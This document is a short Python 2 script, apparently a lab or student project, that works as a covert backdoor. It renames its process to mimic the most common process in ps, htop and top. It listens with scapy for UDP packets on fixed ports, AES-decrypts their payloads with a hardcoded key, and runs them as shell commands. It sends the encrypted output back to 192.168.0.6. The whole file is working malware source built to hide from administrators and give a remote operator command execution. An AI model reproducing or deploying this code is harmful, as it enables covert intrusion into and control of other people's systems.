#!/usr/bin/python

import os, argparse, setproctitle, subprocess, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES
from ctypes import cdll, byref, create_string_buffer

encryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')

def setProcessName(name):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name) + 1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

def maskProcess():
    # Gets the most common process name for ps -aux/htop
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    #print "Most common process for ps/htop: {0}".format(commandResult)

    # Masks the process for ps -aux and htop.
    setproctitle.setproctitle(commandResult)

    # Gets the most common process name from top
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()

    # Masks the process for top
    setProcessName(commandResult)
    #print "Most common process for top: {0}".format(commandResult)

def encrypt(data, encrypt=True):
	if encrypt == True:
		ciphertext = encryptionObject.encrypt(data)
		return ciphertext
	elif encrypt == False:
		plaintext = decryptionObject.decrypt(data)
		return plaintext

def remoteExecute(pkt):
	plaintext = encrypt(pkt.load, encrypt=False)
	command = subprocess.Popen(plaintext, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	output = command.stdout.read() + command.stderr.read()

	if not output:
		output = 'no data'

	ciphertext = encrypt(output)
	dstIP = pkt[0][1].src
	resultPkt = IP(dst='192.168.0.6')/UDP(sport=7999, dport=8000)/Raw(load=ciphertext)
	send(resultPkt, verbose=0)


def main():
	maskProcess()
	sniff(filter="udp and src port 8000 and dst port 7999", prn=remoteExecute)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print "Exiting.."